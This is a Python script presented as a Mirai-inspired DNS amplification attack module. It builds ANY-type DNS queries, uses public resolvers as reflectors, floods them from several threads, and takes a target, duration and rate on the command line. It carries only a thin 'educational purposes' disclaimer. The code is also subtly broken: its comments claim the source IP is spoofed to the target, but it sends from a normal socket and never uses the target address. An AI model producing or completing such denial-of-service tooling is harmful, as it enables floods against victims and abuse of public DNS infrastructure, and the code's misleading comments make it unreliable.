#!/usr/bin/env python3
"""
DNS Amplification Attack Module - Mirai-inspired Implementation
Educational/Research Purpose Only

This module implements a DNS amplification attack similar to those used
by Mirai and other botnets.
"""

import socket
import struct
import random
import time
import threading
import argparse
from typing import List, Dict, Optional, Tuple

class DNSAmplificationAttack:
    """
    Implements a DNS amplification attack
    """
    
    def __init__(self, dns_servers: Optional[List[str]] = None):
        """
        Initialize DNS amplification attack
        
        Args:
            dns_servers: List of DNS servers to use for amplification
        """
        self.dns_servers = dns_servers or []
        self.running = False
        self.attack_threads = []
        self.lock = threading.Lock()
        self.packet_count = 0
        
        # Load default DNS servers if none provided
        if not self.dns_servers:
            self.load_default_dns_servers()
    
    def load_default_dns_servers(self):
        """Load list of default DNS servers to use for amplification"""
        # These are common open DNS resolvers
        # In a real attack, the attacker would use a list of vulnerable open resolvers
        default_servers = [
            "8.8.8.8",       # Google DNS
            "8.8.4.4",       # Google DNS
            "9.9.9.9",       # Quad9
            "1.1.1.1",       # Cloudflare
            "1.0.0.1",       # Cloudflare
            "208.67.222.222", # OpenDNS
            "208.67.220.220", # OpenDNS
            "64.6.64.6",     # Verisign
            "64.6.65.6"      # Verisign
        ]
        
        self.dns_servers = default_servers
        print(f"[*] Loaded {len(self.dns_servers)} default DNS servers")
    
    def create_dns_query(self, domain: str = "example.com", record_type: int = 255) -> bytes:
        """
        Create a DNS query packet
        
        Args:
            domain: Domain name to query
            record_type: DNS record type (255=ANY which creates largest response)
            
        Returns:
            DNS query packet as bytes
        """
        # Transaction ID
        transaction_id = random.randint(0, 65535)
        
        # Flags (Standard query)
        flags = 0x0100
        
        # Questions count
        qdcount = 1
        
        # Answer RRs, Authority RRs, Additional RRs
        ancount = 0
        nscount = 0
        arcount = 0
        
        # Create header
        header = struct.pack('!HHHHHH', transaction_id, flags, qdcount, ancount, nscount, arcount)
        
        # Encode domain name
        parts = domain.split('.')
        qname = b''
        
        for part in parts:
            length = len(part)
            qname += struct.pack('B', length)
            qname += part.encode()
        
        # Terminating zero length
        qname += b'\x00'
        
        # Query type and class
        qtype = record_type  # ANY record type gives largest amplification
        qclass = 1  # IN (Internet)
        
        # Build question
        question = qname + struct.pack('!HH', qtype, qclass)
        
        # Combine header and question
        query = header + question
        
        return query
    
    def start_attack(self, target_ip: str, target_port: int = 53, 
                    duration: int = 60, threads: int = 3, 
                    queries_per_second: int = 100) -> bool:
        """
        Start DNS amplification attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
            threads: Number of attack threads
            queries_per_second: Queries per second per thread
            
        Returns:
            Success status
        """
        if self.running:
            print("[!] Attack already running")
            return False
        
        # Set domains that will cause large responses
        domains = [
            "example.com",
            "google.com", 
            "amazon.com",
            "facebook.com", 
            "netflix.com",
            "microsoft.com",
            "cloudflare.com"
        ]
        
        self.running = True
        self.packet_count = 0
        self.attack_threads = []
        
        # Create stop event
        stop_event = threading.Event()
        
        # Start attack threads
        for i in range(threads):
            thread = threading.Thread(
                target=self._attack_thread,
                args=(target_ip, target_port, domains, stop_event, queries_per_second),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
        
        print(f"[+] Started DNS amplification attack on {target_ip}:{target_port}")
        print(f"[+] Using {len(self.dns_servers)} DNS servers with {threads} threads")
        print(f"[+] Attack will run for {duration} seconds")
        
        # Schedule attack to stop after duration
        stop_thread = threading.Thread(
            target=lambda: (time.sleep(duration), stop_event.set()),
            daemon=True
        )
        stop_thread.start()
        
        return True
    
    def _attack_thread(self, target_ip: str, target_port: int, domains: List[str], 
                      stop_event: threading.Event, queries_per_second: int):
        """Thread function for DNS amplification"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Set socket timeout
            sock.settimeout(1)
            
            # Calculate delay between packets
            delay = 1.0 / queries_per_second if queries_per_second > 0 else 0
            
            # Attack until stop event is set
            while not stop_event.is_set():
                try:
                    # Select random DNS server and domain
                    dns_server = random.choice(self.dns_servers)
                    domain = random.choice(domains)
                    
                    # Create DNS query with random domain
                    query = self.create_dns_query(domain, 255)  # Type ANY for maximum amplification
                    
                    # Send packet with spoofed source IP (target IP)
                    # Note: IP spoofing won't work on most networks without special privileges
                    # This is for educational demonstration only
                    sock.sendto(query, (dns_server, 53))
                    
                    # Increment packet counter
                    with self.lock:
                        self.packet_count += 1
                    
                    # Sleep to maintain rate
                    time.sleep(delay)
                    
                except Exception as e:
                    pass
        
        except Exception as e:
            print(f"[!] Attack thread error: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def stop_attack(self):
        """Stop ongoing attack"""
        self.running = False
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join(timeout=1)
        
        print(f"[*] Attack stopped. Sent {self.packet_count} packets")
        return True
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return {
            'running': self.running,
            'thread_count': len(self.attack_threads),
            'packet_count': self.packet_count,
            'dns_servers': len(self.dns_servers)
        }


if __name__ == "__main__":
    # Demo mode when run directly
    parser = argparse.ArgumentParser(description='DNS Amplification Attack Module - Educational Purposes Only')
    parser.add_argument('--target', '-t', required=True, help='Target IP address')
    parser.add_argument('--port', '-p', type=int, default=53, help='Target port')
    parser.add_argument('--duration', '-d', type=int, default=10, help='Attack duration in seconds')
    parser.add_argument('--threads', '-n', type=int, default=1, help='Number of attack threads')
    parser.add_argument('--rate', '-r', type=int, default=10, help='Queries per second per thread')
    
    args = parser.parse_args()
    
    print("[*] DNS Amplification Attack Module (Mirai-inspired)")
    print("[*] WARNING: For educational/research purposes only")
    print("[*] Do not use against targets without proper authorization")
    
    attack = DNSAmplificationAttack()
    
    print(f"\n[*] Starting attack against {args.target}:{args.port}")
    print(f"[*] Duration: {args.duration}s, Threads: {args.threads}, Rate: {args.rate} qps/thread")
    
    attack.start_attack(args.target, args.port, args.duration, args.threads, args.rate)
    
    try:
        # Wait for attack to complete
        time.sleep(args.duration + 1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    finally:
        attack.stop_attack()
